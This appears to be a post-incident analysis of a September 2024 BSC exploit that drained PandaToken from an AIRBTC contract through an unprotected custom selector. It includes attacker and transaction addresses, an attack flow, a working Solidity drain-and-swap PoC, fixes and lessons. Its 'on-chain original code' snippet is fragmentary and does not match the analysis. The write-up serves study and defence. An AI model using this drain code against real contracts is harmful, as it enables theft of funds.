# AIRBTC (PandaToken) — LP Pool Balance Drain via Custom Selector Analysis

| Field | Details |
|------|------|
| **Date** | 2024-09-05 |
| **Protocol** | AIRBTC / PandaToken |
| **Chain** | BSC |
| **Loss** | ~6,800 USD |
| **Attacker** | [0xcc116696f9852c238a5c8d3d96418ddba02357fc](https://bscscan.com/address/0xcc116696f9852c238a5c8d3d96418ddba02357fc) |
| **Attack Tx** | [0x00e4bbc86369d67e21b1910c4f9178c8257ce96192039a7839bd4d3593e1cd27](https://bscscan.com/tx/0x00e4bbc86369d67e21b1910c4f9178c8257ce96192039a7839bd4d3593e1cd27) |
| **Vulnerable Contract** | [0x12050e4355a392162698c6cf30eb8c9e0777300d](https://bscscan.com/address/0x12050e4355a392162698c6cf30eb8c9e0777300d) |
| **Root Cause** | Token drain via selector 0x008ea502 — allows moving external tokens without an internal balance |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-09/AIRBTC_exp.sol) |

---

## 1. Vulnerability Overview

The selector `0x008ea502` function in the AIRBTC vulnerable contract (`0x12050e...`) transferred the token amount passed as a parameter directly to the caller. The attacker queried the balance of PandaToken held within the vulnerable contract, then called the `0x008ea502` selector to move the entire balance to themselves, and swapped it to USDT via PancakeRouter.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: selector 0x008ea502 — token transfer with no access control
// Parameters: (uint256 offset, uint256 amount, address recipient, uint256 flags, bytes32 tag)
function execute(uint256 offset, uint256 amount, address recipient, uint256 flags, bytes32 tag) external {
    // ❌ No caller validation — anyone can move tokens held in the vulnerable contract
    IERC20(targetToken).transfer(recipient, amount);
}

// ✅ Fixed code: access control added
function execute(uint256 offset, uint256 amount, address recipient, uint256 flags, bytes32 tag) external {
    require(msg.sender == authorizedCaller, "Not authorized");  // ✅ Restrict caller
    require(amount <= withdrawLimit, "Exceeds limit");          // ✅ Restrict amount
    IERC20(targetToken).transfer(recipient, amount);
}
```

### On-chain Original Code

Source: Sourcify verified

```solidity
// File: AIRBTC_decompiled.sol
contract AIRBTC {
    function balanceOf(address p0) external view returns (uint256) {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► Query PandaToken balance held in vulnerable contract
  │         └─► PandaToken.balanceOf(addr=0x12050e) = X
  │
  ├─[2]─► Call selector 0x008ea502
  │         └─► abi.encodeWithSelector(0x008ea502, 96, X, address(this), 3, 0x4149520...)
  │         └─► Move entire balance to AttackerContract
  │
  ├─[3]─► Swap PandaToken → USDT via PancakeRouter
  │         └─► swapExactTokensForTokensSupportingFeeOnTransferTokens
  │
  └─[4]─► Total loss: ~6,800 USD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract AddrCC {
    function process(address tokenIn, address tokenOut) external {
        // [1] Query PandaToken balance held in the vulnerable contract
        (bool ok1, bytes memory ret1) = tokenIn.staticcall(
            abi.encodeWithSelector(IERC20(tokenIn).balanceOf.selector, addr)
        );
        uint256 bal = abi.decode(ret1, (uint256));

        // [2] Drain tokens via selector 0x008ea502
        bytes memory data = abi.encodeWithSelector(
            bytes4(0x008ea502),
            uint256(96),           // offset
            bal,                   // amount: full balance
            address(this),         // recipient: attacker
            uint256(3),            // flags
            bytes32(hex"4149520000000000000000000000000000000000000000")  // tag: "AIR"
        );
        addr.call(data);

        // [3] Swap PandaToken → USDT
        uint256 amt = IERC20(tokenIn).balanceOf(address(this));
        IERC20(tokenIn).approve(PancakeRouter, amt);
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        IPancakeRouter(PancakeRouter).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amt, 0, path, tx.origin, block.timestamp
        );
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Missing Access Control |
| **Attack Technique** | Custom Selector Token Drain |
| **DASP Category** | Access Control |
| **CWE** | CWE-284: Improper Access Control |
| **Severity** | High |
| **Attack Complexity** | Low |

## 6. Remediation Recommendations

1. **Access control on all external functions**: Functions that move tokens must be restricted so that only authorized addresses can call them.
2. **Audit custom selectors**: Non-standard function selectors must be held to the same security standard as regular functions.
3. **Set withdrawal amount caps**: Limit the maximum amount that can be withdrawn in a single call.
4. **Publish source code**: Unverified contracts make vulnerabilities difficult to detect; verification is mandatory.

## 7. Lessons Learned

- **Non-standard selectors are also vulnerable**: Token drains are possible not only through standard ERC20 functions but also via custom selectors.
- **Balance query → drain pattern**: The attacker queries the token balance held in the vulnerable contract, then drains exactly that amount.
- **Chained vulnerabilities in unverified contracts**: The same pattern seen in COCO was repeated in AIRBTC.